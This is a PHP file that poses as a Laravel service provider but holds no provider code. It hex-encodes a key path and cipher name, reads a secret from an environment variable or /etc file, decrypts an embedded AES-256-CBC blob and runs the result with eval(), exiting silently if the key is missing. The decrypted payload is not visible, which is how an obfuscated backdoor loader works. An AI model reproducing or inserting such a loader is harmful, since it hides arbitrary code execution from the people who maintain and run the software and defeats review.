<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TlAVltMITke5aF7rlmO2XA==');

$c=base64_decode(

'q+s9SHIAjKDt+mKQ5P23RD220klws1+Vm86WSjkNp0PGftKEhWmkRkSCyBCTNvsm+QEgmUYYxp9E' .
'kW0fshQC07vKRP7m/1PL2gktw0Qc8yJVxxXHWJOtdqBtSdyc7oOc89kT2vdMExyZ3le6dxESTXiE' .
'C2J6fklOyHVm8TP+y2oH6yzTQsuvptK1Q7jcAG7obKPkU+/HeXt/k1X5DTuQIBhynXbYUpAs9xAg' .
'kA5GvbnXGQlPevc+ooX+OZNIXauVQxNzQP80qrOoSMN83BrmbO4U95pEnQ54WDiEB9NuTv12EtNQ' .
'80C9m5hTi7PlFIUSe9B7Negsu25n2yJqp5sQuplN/qR5a0wC6HSy8mwTFEuHLCnmtTESp/QRnxEU' .
'oD61/P3YBJvLJe/fXLP6wetlqtLbMryioxeDMgIiY3DoNxGhDk3wQSVwoYJqqhheVu0HkLuj9B8E' .
'uP10dt1kUuZyvPs0j9S5f1IfKxPOrYLB1+/pt8OcPV47XimjAmmXLi1HSyI/UnzxYzq7uQdz6JQS' .
'iQiN9fijR2lXGnJ41wenKUF57pSb+Ymog/C+T3qADchrcjNUe7+Cj+uTG+S2kDwXT7uvwMLXs1+v' .
'8Jsc/2nEUGC4xNe902A/cQo9pBZx97HM6mrtMhp1bx7qJXezW9RvyDRelasEW5DkfIBv9SfOSprD' .
'0vFa9QHsdlh/KCNjYeun6q9RBC/0s3ixiArngyAriwlsu9JO2iRhwGcuGywKt+fY5MHQjx5vnIa9' .
'fAyWWfS9/WTP5f2rrVZ2aAaHB+2/8Ttgn6rnGIv3Cw2dRBFA1cTpBG7HMwoNLYakL0Wde7yF3a2a' .
'fLYYdil+LtGoVpPpaL0/TPv0deS91AYlXEXiig3z0JYwCN5GQKncQAQMIEAXkhCfZF9y7MADRNWz' .
'2Sx6dUCOvV9s/9Sc2P5TmvUwQBzd5Nk5PAIgEbBVp4LQWvoD'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

